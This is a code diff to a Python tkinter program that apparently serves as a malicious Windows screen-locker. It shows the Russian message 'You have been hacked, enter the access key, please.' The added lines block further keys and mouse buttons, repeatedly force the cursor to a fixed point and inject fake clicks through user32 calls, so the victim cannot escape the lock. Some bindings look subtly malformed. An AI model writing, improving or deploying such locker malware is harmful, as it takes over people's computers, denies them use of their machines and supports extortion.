@@ -33,11 +33,19 @@ class LockScreen(tk.Tk):
         self.bind("<Escape>", lambda event: "break")
         self.bind("<Alt-F4>", lambda event: "break")
         self.bind("<KeyPress>", lambda event: "break")
-             
+        self.bind("<Tab>", lambda event: "break")
+        self.bind("<Control-KeyPress>", lambda event: "break")
+        self.bind("Button-1", lambda event: "break")
+        self.bind("Button-2", lambda event: "break")
+        self.bind("Button-3", lambda event: "break")
+        self.bind("<Motion>", lambda event: "break")
+        
         self.start_audio()
 
         self.red_mode = False
         self.after(1000, self.blink_background)
+        self.after(200, self.center_mouse)
+        self.after(1000, self.auto_click)
 
         self.monitor_count = self.get_monitor_count()
         message = "Тебя взломали, введи ключ доступа, пожалуйста"
@@ -103,6 +111,20 @@ class LockScreen(tk.Tk):
             self.mci_send(f"stop {alias}", None, 0, None)
             self.mci_send(f"close {alias}", None, 0, None)
         self.destroy()
+
+    def center_mouse(self):
+        x = self.virtual_left + (self.virtual_width // 2) + 200
+        y = self.virtual_top + (self.virtual_height // 2)
+        ctypes.windll.user32.SetCursorPos(x, y)
+        self.after(200, self.center_mouse)
+
+    def auto_click(self):
+        x = self.virtual_left + (self.virtual_width // 2) + 200
+        y = self.virtual_top + (self.virtual_height // 2)
+        ctypes.windll.user32.SetCursorPos(x, y)
+        ctypes.windll.user32.mouse_event(0x0002, 0, 0, 0, 0)
+        ctypes.windll.user32.mouse_event(0x0004, 0, 0, 0, 0)
+        self.after(1000, self.auto_click)
 
     def blink_background(self):
         self.red_mode = not self.red_mode
